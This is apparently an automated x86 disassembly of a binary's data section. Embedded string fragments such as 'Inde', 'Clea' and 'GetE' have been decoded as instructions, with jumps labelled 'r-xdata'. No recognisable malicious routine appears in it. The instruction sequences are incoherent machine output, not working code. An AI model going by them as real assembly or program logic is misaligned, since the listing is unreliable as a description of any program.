inc edx
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
movsb [ edi ] [ esi ]
push 0x42
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add eax 0x65646e49
js r-xdata
arpl [ ebp + 0x2 ] sp
add [ edx ] al
add [ ebx ] ch
add [ eax + 0xb004319 ] bl
inc edx
imul ebp [ gs : bp + 0x55 ] 0x74616470
add eax [ gs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
movsb [ edi ] [ esi ]
push 0x42
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
and eax 0x4319ac00
add [ 0x61656c43 ] al
jb r-xdata
insb
add al [ eax ]
add [ eax + 0x1004260 ] bl
add [ esi ] al
push ebx
outsd
jne r-xdata
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ edx + ebp * 2 + 0x42 ] ah
add al 0x53
jb r-xdata
push 0x42
add [ eax ] al
add [ ebx + edx * 2 ] al
jb r-xdata
add [ ecx ] ch
add [ edx + ebx ] dl
inc ebx
add [ ecx ] cl
inc ebp
outsb
push ebp
jo r-xdata
add [ edx ] al
insb
add al [ eax ]
add al [ eax ]
xor eax 0x431db000
add [ esi ] al
inc esp
insb
je r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
movsb [ edi ] [ esi ]
push 0x42
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ edx + ebp * 2 + 0x42 ] ah
add [ eax ] al
or [ eax ] al
add al [ eax ]
movsb [ edi ] [ esi ]
push 0x42
add [ eax ] al
add [ ebx + edx * 2 ] al
add eax [ eax ]
add [ eax ] al
jns r-xdata
add [ ebx + 0x426aa8c0 ] cl
add [ edx ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
sbb al 0x64
inc edx
add [ eax ] cl
add [ edx ] al
add [ edx + ebp * 2 + 0x42 ] ah
add al 0x53
je r-xdata
outsd
popad
je r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
movsb [ edi ] [ esi ]
push 0x42
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
and eax 0x431de000
add [ 0x656e774f ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ edx + ebp * 2 + 0x42 ] ah
add al 0x53
add [ eax ] 0x0
add [ eax + 0x4909ffff ] al
je r-xdata
jae r-xdata
jb r-xdata
inc edx
add [ eax + 0x66 ] bl
add [ eax ] cl
add [ ecx ] al
add [ edx + ebp * 2 + 0x42 ] ah
add al 0x53
insb
add al [ eax ]
add al [ eax ]
add [ ss : eax + 0xb00431a ] bh
inc edi
je r-xdata
pop eax
inc dx
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
movsb [ edi ] [ esi ]
push 0x42
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
add [ ss : eax ] ah
sbb al [ ebx ]
or al [ esi + 0x69 ]
outsb
dec ecx
je r-xdata
inc edx
add [ eax ] cl
add [ ecx ] al
add [ edx + ebp * 2 + 0x42 ] ah
add al 0x53
insb
add al [ eax ]
add al [ eax ]
and eax [ eax ]
rcr [ eax ] 0x1
inc ebx
add [ ebx ] al
inc ecx
add eax [ fs : eax ]
sbb al 0x64
inc edx
add [ eax + 0x8004260 ] bl
push ecx
insd
inc ebx
insb
popad
jae r-xdata
add [ ebx ] al
add [ edx ] al
loop r-xdata
add eax 0x65646e49
js r-xdata
add [ eax ] al
pushfd
adc [ eax ] al
add [ eax ] eax
popad
insd
push eax
popad
je r-xdata
add [ eax ] cl
add [ edx ] al
add [ edx + ebp * 2 + 0x42 ] ah
add al 0x53
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add cl [ ecx + 0x44 ]
add al [ eax ]
add al [ eax ]
sub eax 0x431a6400
add [ 0x45746547 ] cl
outsb
jne r-xdata
insd
dec ecx
inc esp
add eax [ eax ]
sbb al 0x64
inc edx
add [ ebp + ebp * 2 + 0x42 ] bl
add [ esp + ebp * 2 + 0x42 ] ah
je r-xdata
jne r-xdata
lea eax [ eax ]
push eax
imul eax [ edx ] 0xf
cmovns edx [ ebx + 0x74 ]
jb r-xdata
inc edx
add [ edx ] al
add [ edx ] al
add eax 0x200426b
add [ edx ] al
and eax 0x200426b
je r-xdata
add eax [ eax ]
inc eax
adc al [ eax ]
or [ eax ] al
add al [ eax ]
movsb [ edi ] [ esi ]
push 0x42
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
inc eax
inc eax
adc al [ eax ]
add [ eax ] eax
add [ ecx ] eax
add al [ eax ]
add al [ eax ]
xor eax 0x431cc000
add [ esi ] al
dec ecx
outsb
jae r-xdata
sbb al 0x77
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax ] cl
inc esi
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
push 0x73147261
dec esi
popad
insd
push esi
popad
insb
add [ edx + 0x426c ] dl
push ebx
jo r-xdata
jo r-xdata
outsb
jae r-xdata
sbb al 0x40
add [ ecx ] al
xor al 0x2f
pushfd
jae r-xdata
arpl [ ecx + 0x74 ] bp
jns r-xdata
cmp bh 0xff
add eax 0x6e756f43
outsb
or al 0x67
inc edx
add [ eax + 0x4260 ] bl
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
outsd
add [ edx ] al
add [ eax + edx + 0x1a740040 ] bl
inc ebx
add [ eax + 0x100431d ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4308ffff ] al
popad
jo r-xdata
add [ edx ] al
jb r-xdata
add [ edx ] cl
inc edi
je r-xdata
imul ebp [ esi + 0x67 ] 0x273
add [ ebx ] al
add cl al
insb
inc edx
add [ eax + eax - 0xc ] al
jb r-xdata
inc esp
popad
jo r-xdata
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4307da82
insb
popad
jae r-xdata
add [ edi ] al
or edx [ ebx + eax * 2 + 0x6f ]
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
mov eax eax
test al 0x6a
inc edx
adc [ eax ] al
pushfd
sbb al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305ffff ] al
outsd
jne r-xdata
inc edx
add [ eax + eax ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
pop eax
insd
jne r-xdata
add [ eax ] al
add [ esi + 0x1000426c ] ch
insb
inc edx
add [ eax ] al
je r-xdata
insb
inc edx
jne r-xdata
push ecx
adc [ ebx + 0x64 ] esi
push ebx
jb r-xdata
nop
jae r-xdata
add al 0x0
je r-xdata
jpo r-xdata
outsb
jae r-xdata
add [ eax ] al
pop es
jb r-xdata
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
adc al 0x40
jb r-xdata
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
imul esp [ ebx + 0x74 ] 0x696c6544
insd
imul esi [ ebp + 0x72 ] 0x616c4307
jae r-xdata
add [ eax ] al
test [ ebx + 0x42 ] ch
add [ ebx ] cl
jae r-xdata
inc edx
add [ ebx ] al
add edi [ edx ]
xor esi [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax + eax ] al
inc [ edx ]
add [ eax + 0x300426b ] cl
add bh bh
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x65 ] 0x6b840164
inc edx
insb
imul ebp [ ebp + 0x69 ] 0xb726574
jae r-xdata
inc esp
xor [ ebx ] eax
test [ ebx + eax * 2 ] dh
add al al
push ds
inc edx
add [ eax ] al
add [ eax ] al
add [ edi + 0x70 ] ah
inc edx
jb r-xdata
outsb
jne r-xdata
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x63ffbce2 ] dl
adc eax [ ebx ]
clc
and [ ebx ] al
jae r-xdata
je r-xdata
outsb
je r-xdata
jae r-xdata
inc eax
add al ah
push ebp
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
pushfd
adc [ eax ] al
add al 0x0
jae r-xdata
inc ebx
add ah ah
push ds
inc ebx
add [ edi + ebx ] dl
inc ebx
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax - 0x4fffbcde ] ah
inc ebx
add [ eax + ebp + 0x29280043 ] bl
inc ebx
add ah bh
sub [ ebx ] eax
push 0x30004046
sub al [ ebx ]
pushad
sub al [ ebx ]
mov ah 0x2a
inc ebx
add [ eax ] dl
sub eax [ ebx ]
sbb al 0x2b
inc ebx
add [ eax ] dl
sub al 0x43
add [ ebp + ebp + 0x2db40043 ] ah
inc ebx
add [ esi + ebp ] dl
inc ebx
add [ esi + ebp ] ah
inc ebx
add [ edi + ebp ] bh
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] cl
add [ eax ] al
add [ ebx + ebp * 2 + 0x42 ] cl
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
push 0xac004046
inc ebx
add [ edi ] al
outsb
add [ eax ] ah
add [ eax ] al
add [ eax + 0x5f ] ch
jb r-xdata
add [ ecx ] al
add [ edx ] al
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
jb r-xdata
inc eax
add [ eax ] cl
add [ edx ] al
add [ eax + 0x6d ] bl
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
inc eax
inc eax
adc al [ eax ]
add [ eax ] eax
add [ ecx ] eax
add al [ eax ]
add al [ eax ]
sub [ eax ] al
je r-xdata
add [ eax + 0x12 ] al
add [ eax ] al
add [ esp + edx ] bh
inc eax
inc edx
add [ eax ] dl
je r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x61657242
imul edx [ ecx ] 0x73
push ebx
hlt
add [ eax + r-xdata ] dl
push es
andps xmm2 [ ebx + 0x74 ]
jb r-xdata
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add [ eax ] dl
inc eax
add [ eax ] cl
add [ ecx ] al
add [ eax + 0x6d ] bl
inc eax
add [ esi + ebp * 2 ] cl
jo r-xdata
inc ebx
insb
popad
jae r-xdata
insb
inc edx
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ edi ] al
add al [ eax ]
add al [ eax ]
mov eax eax
pop esp
insd
inc edx
add [ edi ] al
adc dl [ ebx + edx * 2 + 0x74 ]
jb r-xdata
insb
inc ebx
add [ eax ] cl
dec ebp
outsd
jbe r-xdata
add [ eax ] al
push es
inc esi
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax + edx + 0x40040 ] bl
outsb
jae r-xdata
inc ebx
add al al
sub al 0x43
add al dh
sub al 0x43
add ah bl
inc ebx
add [ edi + ebp + 0x31380043 ] cl
inc ebx
add [ esp + esi + 0x1ec00043 ] al
inc esi
inc eax
add [ ebx + 0x46680043 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307ffff ] al
jne r-xdata
dec esi
js r-xdata
pop eax
inc eax
add [ eax - 0x2fffbfa8 ] dh
add [ edx ] al
add [ esp + ebp * 2 + 0x42 ] ah
imul bp [ gs : esi + 0x65 ] 0x164
test [ ebx + 0x42 ] ch
inc eax
add [ esi + 0x27040043 ] ch
add [ eax + 0x46 ] ch
jb r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 2 + 0x77200042 ] bl
inc edx
add [ esi + 0x7b00426e ] dh
outsd
lea eax [ eax ]
or al 0x6e
add eax [ eax ]
int3
je r-xdata
outsb
sub_426d88
insd
inc edx
add [ edx ] al
add [ edx ] al
add [ eax + 0x12 ] al
inc eax
add [ esi + ebx + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307ffff ] al
jne r-xdata
add [ eax + 0x46 ] ch
jb r-xdata
int3
outsb
add [ eax ] dl
inc eax
add [ eax ] cl
add [ ecx ] al
add [ eax + 0x6d ] bl
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
mov eax eax
pop esp
insd
inc edx
add [ edi ] al
adc dl [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc eax
add [ esi + ebp * 2 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 2 + 0x77200042 ] bl
inc edx
add [ esi + 0x7b00426e ] dh
outsd
jpo r-xdata
outsb
jae r-xdata
inc ebx
add ah ah
push ds
inc ebx
add [ edi + ebx ] dl
inc ebx
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax - 0x4fffbcde ] ah
inc ebx
add [ eax + ebp + 0x29280043 ] bl
inc ebx
add ah bh
sub [ ebx ] eax
push 0x30004046
sub al [ ebx ]
pushad
sub al [ ebx ]
mov ah 0x2a
inc ebx
add [ eax ] dl
sub eax [ ebx ]
sbb al 0x2b
inc ebx
add [ eax ] dl
sub al 0x43
add [ ebp + ebp + 0x2db40043 ] ah
inc ebx
add [ esi + ebp ] dl
inc ebx
add [ esi + ebp ] ah
inc ebx
add [ edi + ebp ] bh
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] cl
add [ eax ] al
add [ ebx + ebp * 2 + 0x42 ] cl
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
xor [ ebx ] eax
test [ ebx + eax * 2 ] dh
add al al
push ds
inc edx
add [ eax ] al
add [ eax ] al
add [ edi + 0x70 ] ah
inc edx
jb r-xdata
outsb
jne r-xdata
inc ebx
add al al
sub al 0x43
add al dh
sub al 0x43
add ah bl
inc ebx
add [ edi + ebp + 0x31380043 ] cl
inc ebx
add [ esp + esi + 0x1ec00043 ] al
push 0xac004046
inc ebx
add [ edi ] al
je r-xdata
outsb
add [ eax ] ah
add [ eax ] al
add [ eax + 0x5f ] ch
jb r-xdata
je r-xdata
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
jb r-xdata
jo r-xdata
insb
inc edx
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
inc eax
add [ esi + 0x27040043 ] ch
inc esi
inc eax
add [ ebx + 0x46680043 ] cl
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x63ffbce2 ] dl
adc eax [ ebx ]
clc
and [ ebx ] al
jae r-xdata
add [ ecx ] al
add [ edx ] al
sub_426f86
call [ edi + 0x4a004270 ]
add [ esi ] cl
add ch al
jo r-xdata
add ah dh
call [ ecx + 0x4a004272 ]
add [ edx ] cl
str [ edx ]
jno r-xdata
add [ ebx ] bl
add bl bh
je r-xdata
add [ edx ] al
hlt
add [ ebx ] dl
add cl bl
jb r-xdata
add [ edx ] al
hlt
imul ebp [ esi + 0x67 ] 0x90002773
push ds
inc ebx
add [ edi ] al
add [ edx ] cl
sbb al 0x0
cmp [ ebp + 0x42 ] esi
add [ edx ] cl
sbb eax 0x42758900
add [ edx ] cl
push ds
add cl dl
jne r-xdata
inc eax
add [ ecx ] al
add [ ecx ] al
push ebx
add al [ eax ]
add [ eax ] al
sbb al 0x40
add [ edx ] al
add [ edi ] al
inc ecx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax ] si
add al [ eax ]
xor [ eax ] eax
or [ edi ] bl
inc ebx
add [ esi ] al
inc ecx
jo r-xdata
jb r-xdata
or [ eax ] al
add [ eax ] eax
sbb al 0x77
add [ edx ] cl
pop ds
add [ 0x4a004276 ] cl
add [ eax ] ah
add [ ebx + 0x76 ] bl
inc edx
add [ edx ] cl
and [ eax ] eax
xchg edi eax
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ edi + esi * 2 ] bl
outsb
add eax [ fs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ ecx ] al
push ebx
add al [ eax ]
add al [ eax ]
cmp eax [ eax ]
adc al 0x1f
inc ebx
add [ edx ] cl
inc ecx
push ebx
je r-xdata
add [ eax + 0x12 ] al
jns r-xdata
add [ ebx ] al
inc ecx
add eax [ fs : eax ]
pushfd
adc [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ ecx ] al
push ebx
add al [ eax ]
add al [ eax ]
inc ebp
add ah ah
push ds
inc ebx
add [ ecx ] cl
inc ecx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + eax ] si
pushfd
adc [ eax ] al
or [ eax ] al
add [ edx ] cl
and al [ eax ]
in eax 0x76
inc edx
add [ edx ] cl
and eax [ eax ]
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add eax 0x65646e49
arpl [ ebp + 0x2 ] sp
add [ edx ] al
add [ ebx ] ch
add [ eax + 0xb004320 ] cl
inc edx
imul ebp [ gs : bp + 0x55 ] 0x74616470
add eax [ gs : eax ]
popad
je r-xdata
imul ebp [ esi + 0x67 ] 0x373
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ edi + esi * 2 ] bl
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ edi + esi * 2 ] bl
inc edx
add [ ecx ] al
add [ edi ] al
push ebx
je r-xdata
add [ eax ] al
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ edi + esi * 2 ] bl
add eax [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x80040 ] bl
outsb
jae r-xdata
add [ ecx ] ch
add [ eax + 0x21 ] dl
inc ebx
add [ ecx ] cl
inc ebp
outsb
push ebp
jo r-xdata
add [ edx ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ edi + esi * 2 ] bl
js r-xdata
inc eax
add [ ecx ] al
add [ 0x65646e49 ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
and eax 0x42792c00
add [ 0x61656c43 ] al
add eax [ eax ]
jb r-xdata
popad
imul ebp [ esi + 0x67 ] 0x2000273
add [ esi ] dh
add ah cl
pop ds
inc ebx
add [ esi ] al
inc ecx
jae r-xdata
push ds
inc ebx
add al al
inc esp
jae r-xdata
add [ eax + 0x700431e ] dl
add [ eax ] al
add [ eax ] al
popad
je r-xdata
add [ edx ] al
add [ edi + esi * 2 ] bl
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
insb
add al [ eax ]
add al [ eax ]
xor eax 0x42793400
add [ esi ] al
inc esp
insb
je r-xdata
add al 0x53
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x1004260 ] bl
add [ esi ] al
push ebx
outsd
jne r-xdata
imul esp [ edi + 0x6e ] 0x3
add [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x77
add [ edi + esi * 2 ] bl
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
add al [ eax ]
add [ eax + edx + 0x20040 ] bl
push es
dec ecx
outsb
js r-xdata
or [ eax ] al
add eax [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
push es
dec ecx
outsb
js r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
aaa
add [ ecx + 0x43 ] ah
add [ esi ] al
inc ebp
jno r-xdata
insb
add al [ eax ]
add al [ eax ]
daa
add [ eax ] al
add al 0x53
imul ebp [ esi + 0x67 ] 0x2000273
add [ eax ] cl
mov al [ 0x8004322 ]
inc ebp
js r-xdata
or ecx [ ecx + 0x6e ]
js r-xdata
add [ eax + 0x7004326 ] dh
inc edi
je r-xdata
add al [ eax ]
add al [ eax ]
sub eax 0x43269c00
add [ 0x45746547 ] cl
outsb
jne r-xdata
popad
insb
jae r-xdata
push ebx
push 0x65676e61
add eax [ eax ]
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] al
sbb al 0x40
add [ ecx ] al
add [ edi ] al
inc ecx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax ] si
add al [ eax ]
inc eax
add [ ecx + edi * 2 ] bh
inc edx
add [ esi ] al
dec ecx
outsb
jae r-xdata
dec si
popad
insd
add eax [ gs : eax ]
pushfd
adc [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ esi + ecx * 2 ] al
add eax [ eax ]
enter 0x4011 0x0
or [ eax ] al
add [ eax ] eax
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
xor al [ eax ]
pushfd
sub [ ebx ] al
pop es
dec ecx
outsb
js r-xdata
adc al [ eax ]
add [ eax ] eax
add [ ebx + 0x2 ] edx
add [ edx ] al
add [ ecx ] bh
add [ eax ] ch
sub [ ebx ] eax
jb r-xdata
inc eax
add [ eax ] cl
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ edi + esi * 2 ] bl
inc edx
add [ ecx ] al
add [ edi ] al
push ebx
je r-xdata
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x77
add [ 0x65646e49 ] al
jb r-xdata
push ebx
dec di
bound ebp [ edx + 0x65 ]
arpl [ ebx + eax ] si
pushfd
adc [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
popad
insd
add al [ gs : eax ]
add al [ eax ]
add ah bh
sub [ ebx ] eax
or eax 0x65646e49
js r-xdata
inc eax
adc al [ eax ]
add [ eax ] eax
add al 0x4e
js r-xdata
add ax [ eax ]
pushfd
adc [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ ecx ] al
push ebx
add al 0x53
je r-xdata
inc eax
adc al [ eax ]
add al [ eax ]
add [ ebx + 0x2 ] edx
add [ eax ] al
add [ eax + eax * 2 ] bl
add [ eax ] al
add [ eax ] cl
add [ edi ] al
inc ecx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax ] si
add al [ eax ]
add [ eax + 0x2a ] ah
inc ebx
add [ esp + ecx * 2 ] cl
outsd
popad
inc esi
jb r-xdata
push ebx
add al [ eax ]
add [ eax ] al
sbb al 0x40
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add eax 0x65646e49
js r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
inc eax
adc al [ eax ]
add al [ eax ]
add [ ebx + 0x2 ] edx
add [ edx ] al
add [ edi ] dl
xor [ edx ] ch
inc ebx
add [ ecx + ecx * 2 ] cl
outsb
jae r-xdata
add [ eax ] al
add al [ eax ]
add al [ eax ]
cmp [ eax ] eax
sub [ ecx ] ch
inc ebx
add [ ebx ] cl
dec ecx
outsb
jb r-xdata
inc ecx
add [ edx ] al
insd
inc esi
imul ebp [ ebp + 0x3 ] 0x0
add [ eax ] cl
add [ edx ] al
add [ edi + esi * 2 ] bl
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
or [ eax ] al
add al [ eax ]
sbb al 0x77
jb r-xdata
inc edx
add [ eax ] cl
add [ ecx ] al
add [ eax + 0x6d ] bl
inc ecx
add [ edx ] al
add [ eax ] cl
inc ebp
outsb
insd
push ebx
je r-xdata
sub al 0x86
add [ eax ] cl
inc ebp
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x20002
add [ eax ] dl
sub eax [ ebx ]
push cs
dec esp
outsd
popad
inc esi
jb r-xdata
insd
inc esi
imul ebp [ ebp + 0x3 ] 0x0
add [ eax ] cl
add [ ebx ] al
add [ edi + esi * 2 ] bl
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ eax ] cl
inc esi
imul ebp [ ebp + 0x4e ] 0x2656d61
add [ eax ] al
call 0x242b5ef
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ eax ] cl
inc esi
imul ebp [ ebp + 0x4e ] 0x2656d61
add [ edx ] al
add [ eax ] dl
mov ah 0x2a
inc ebx
add [ esp + ecx * 2 ] cl
outsd
popad
inc esi
jb r-xdata
js r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + eax ] si
add [ eax ] al
add [ eax ] al
or al 0x0
add al 0x0
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add eax 0x65646e49
or [ esi + 0x69 ] al
insb
dec esi
popad
insd
add al [ gs : eax ]
add al [ eax ]
dec esi
add [ ebp + ebp + 0x530a0043 ] dh
outsb
js r-xdata
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x20002
dec eax
add [ eax ] dl
sub al 0x43
add [ ecx * 2 + 0x365766f ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ebx ] al
add [ edi + esi * 2 ] bl
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
inc edx
add [ ecx ] al
add [ esi ] al
push ebx
je r-xdata
popad
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ esi + eax * 4 ] ch
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
or [ ebx + 0x75 ] al
jb r-xdata
add al 0x53
popad
insd
add al [ eax ]
add al [ eax ]
push eax
add [ ebx + ebp ] bl
inc ebx
add [ esi ] cl
dec esp
outsd
popad
inc esi
jb r-xdata
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ esi + eax * 4 ] ch
inc edx
add [ ecx ] al
add [ esi ] al
push ebx
je r-xdata
push esp
outsd
inc esi
imul ebp [ ebp + 0x3 ] 0x0
add [ eax ] cl
add [ ebx ] al
add [ edi + esi * 2 ] bl
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ eax ] cl
inc esi
imul ebp [ ebp + 0x4e ] 0x2656d61
add [ eax ] al
call 0x242b74f
add [ eax ] cl
inc ebp
outsb
pushfd
adc [ eax ] al
add al [ eax ]
add [ eax ] al
dec ecx
insd
push ebx
je r-xdata
add [ ebx + edx * 2 ] al
insb
popad
insd
add al [ eax ]
add al [ eax ]
dec esi
add [ esi + ebp ] ah
inc ebx
add [ ebx + edx * 2 ] cl
popad
jbe r-xdata
jb r-xdata
push esp
outsd
push ebx
je r-xdata
popad
